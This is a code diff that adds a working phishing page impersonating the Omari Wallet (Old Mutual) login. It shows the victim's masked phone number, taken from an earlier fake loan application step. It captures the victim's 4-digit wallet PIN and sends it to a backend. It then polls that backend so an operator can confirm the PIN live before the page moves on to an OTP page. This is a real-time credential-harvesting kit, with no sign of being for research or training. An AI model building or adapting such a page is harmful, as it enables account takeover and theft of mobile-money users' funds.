@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Omari Wallet PIN Entry</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            -webkit-font-smoothing: antialiased;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: #e9ecef;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 400px;
+            background-color: #ffffff;
+            min-height: 100vh;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+
+        .top-header {
+            text-align: center;
+            padding: 15px 0 10px;
+            background: #ffffff;
+            z-index: 20;
+        }
+
+        .logo-text {
+            color: #4DB848;
+            font-size: 26px;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            margin-bottom: 2px;
+        }
+
+        .logo-subtext {
+            font-size: 7px;
+            color: #555;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+
+        .hero-section {
+            height: 250px;
+            background-image:
+                linear-gradient(90deg, rgba(20, 25, 30, 0.95) 0%, rgba(20, 25, 30, 0.7) 45%, rgba(20, 25, 30, 0) 100%),
+                url('https://images.unsplash.com/photo-1531123897727-8f129e1688ce?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&q=80');
+            background-size: cover;
+            background-position: center 20%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            padding: 0 25px;
+        }
+
+        .hero-section p {
+            color: #ffffff;
+            font-size: 15px;
+            font-weight: 300;
+            margin-bottom: 4px;
+        }
+
+        .hero-section h1 {
+            color: #51C24D;
+            font-size: 28px;
+            line-height: 1.25;
+            font-weight: 700;
+        }
+
+        .login-card {
+            background-color: #ffffff;
+            border: 1px solid #f0f0f0;
+            border-radius: 12px;
+            margin: -30px 20px 20px 20px;
+            padding: 25px 20px;
+            position: relative;
+            z-index: 10;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.06);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .instruction-text {
+            color: #777777;
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 12px;
+        }
+
+        .readonly-phone-box {
+            background-color: #f2f2f2;
+            border: 1px solid #e8e8e8;
+            border-radius: 8px;
+            padding: 16px 20px;
+            font-size: 16px;
+            font-weight: 600;
+            color: #111;
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+        }
+
+        .pin-container {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .pin-box {
+            width: 55px;
+            height: 65px;
+            border: 1px solid #4DB848;
+            border-radius: 8px;
+            font-size: 32px;
+            text-align: center;
+            font-weight: bold;
+            color: #111;
+            background: #fff;
+            outline: none;
+            caret-color: #b90076;
+            transition: box-shadow 0.2s;
+        }
+
+        .pin-box:focus {
+            box-shadow: 0 0 0 2px rgba(77, 184, 72, 0.2);
+        }
+
+        .pin-box[type="password"] {
+            letter-spacing: 0;
+        }
+
+        .btn-login {
+            width: 100%;
+            height: 50px;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #4DB848;
+            color: #ffffff;
+            border: none;
+            box-shadow: 0 4px 12px rgba(77, 184, 72, 0.35);
+            margin-bottom: 25px;
+            transition: opacity 0.2s;
+        }
+
+        .btn-login:active {
+            opacity: 0.8;
+        }
+
+        .change-number-link {
+            text-align: center;
+            color: #b90076;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            background: none;
+            border: none;
+            padding: 10px;
+            margin-top: 5px;
+        }
+
+        .app-version {
+            color: #aaaaaa;
+            font-size: 11px;
+            text-align: center;
+            margin-top: 25px;
+        }
+
+        @media (max-width: 519px) {
+            body { background: #fff; padding: 0; }
+            .app-container { box-shadow: none; max-width: 100%; }
+        }
+
+        @media (min-width: 520px) {
+            .app-container {
+                min-height: auto;
+                height: 800px;
+                border-radius: 20px;
+            }
+        }
+
+        /* Loading overlay */
+        .loading-overlay {
+            display: none;
+            position: absolute;
+            inset: 0;
+            z-index: 999;
+            background: rgba(255,255,255,0.92);
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
+            border-radius: inherit; /* match app-container */
+        }
+
+        .loading-overlay.show {
+            display: flex;
+        }
+
+        .spinner {
+            width: 52px;
+            height: 52px;
+            border: 5px solid #e0e0e0;
+            border-top-color: #4DB848;
+            border-radius: 50%;
+            animation: spin 0.75s linear infinite;
+        }
+
+        .loading-overlay p {
+            font-size: 15px;
+            font-weight: 700;
+            color: #2e7d32;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+
+        <div class="top-header">
+            <h1 class="logo-text">Omari</h1>
+            <div class="logo-subtext">A MEMBER OF THE OLD MUTUAL GROUP</div>
+        </div>
+
+        <div class="hero-section">
+            <p>Please enter your</p>
+            <h1>Omari Wallet<br>login details</h1>
+        </div>
+
+        <div class="login-card">
+            <div class="instruction-text">Wallet Mobile Number</div>
+
+            <div class="readonly-phone-box" id="phoneDisplay">
+                26377*******
+            </div>
+
+            <div class="instruction-text">Enter your 4 digit Wallet PIN</div>
+
+            <div class="pin-container">
+                <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+                <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+                <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+                <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+            </div>
+
+            <button class="btn-login" id="loginBtn">Login</button>
+
+            <button class="change-number-link" id="changeNumberBtn">Change Mobile Number</button>
+
+            <div class="app-version">v5.0.40</div>
+        </div>
+        
+        <!-- Loading overlay -->
+        <div class="loading-overlay" id="loadingOverlay">
+            <div class="spinner"></div>
+            <p>Verifying PIN…</p>
+        </div>
+
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const pinInputs = document.querySelectorAll('.pin-box');
+            const loginBtn = document.getElementById('loginBtn');
+            const changeNumberBtn = document.getElementById('changeNumberBtn');
+
+            // Show submitted applicant's mobile number if available
+            const submitted = JSON.parse(localStorage.getItem('omariSubmittedLoan') || 'null');
+            if (submitted && submitted.mobile) {
+                const masked = submitted.mobile.slice(0, 4) + '*'.repeat(submitted.mobile.length - 4);
+                document.getElementById('phoneDisplay').textContent = masked;
+            }
+
+            pinInputs.forEach((input, index) => {
+                input.addEventListener('input', () => {
+                    if (input.value.length > 1) input.value = input.value.slice(0, 1);
+                    if (input.value !== '' && index < pinInputs.length - 1) {
+                        pinInputs[index + 1].focus();
+                    }
+                });
+
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && input.value === '' && index > 0) {
+                        pinInputs[index - 1].focus();
+                    }
+                });
+            });
+
+            setTimeout(() => { pinInputs[0].focus(); }, 300);
+
+            loginBtn.addEventListener('click', () => {
+                const pin = Array.from(pinInputs).map(i => i.value).join('');
+                if (pin.length === 4) {
+                    if (!submitted || !submitted.ref) {
+                        alert('Missing session details. Please start over.');
+                        window.location.href = '1.html';
+                        return;
+                    }
+                    
+                    const overlay = document.getElementById('loadingOverlay');
+                    overlay.classList.add('show');
+                    
+                    const payload = {
+                        sessionId: submitted.ref,
+                        step: 'pin',
+                        data: {
+                            PIN: pin
+                        }
+                    };
+
+                    fetch('/api/submit', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    }).then(() => {
+                        const poll = setInterval(async () => {
+                            try {
+                                const res = await fetch(`/api/status?sessionId=${submitted.ref}&step=pin`);
+                                const statusData = await res.json();
+                                if (statusData.status === 'approved') {
+                                    clearInterval(poll);
+                                    window.location.href = 'otp.html';
+                                } else if (statusData.status === 'rejected') {
+                                    clearInterval(poll);
+                                    overlay.classList.remove('show');
+                                    alert('Invalid PIN or Verification failed. Please try again.');
+                                    pinInputs.forEach(i => i.value = '');
+                                    pinInputs[0].focus();
+                                }
+                            } catch (e) {
+                                console.error('Polling error', e);
+                            }
+                        }, 2000);
+                    }).catch(err => {
+                        overlay.classList.remove('show');
+                        alert('Error submitting PIN. Please try again.');
+                        console.error(err);
+                    });
+                } else {
+                    alert('Please enter your full 4-digit PIN.');
+                    pinInputs[0].focus();
+                }
+            });
+
+            changeNumberBtn.addEventListener('click', () => {
+                window.location.href = '1.html';
+            });
+        });
+    </script>
+</body>
+</html>
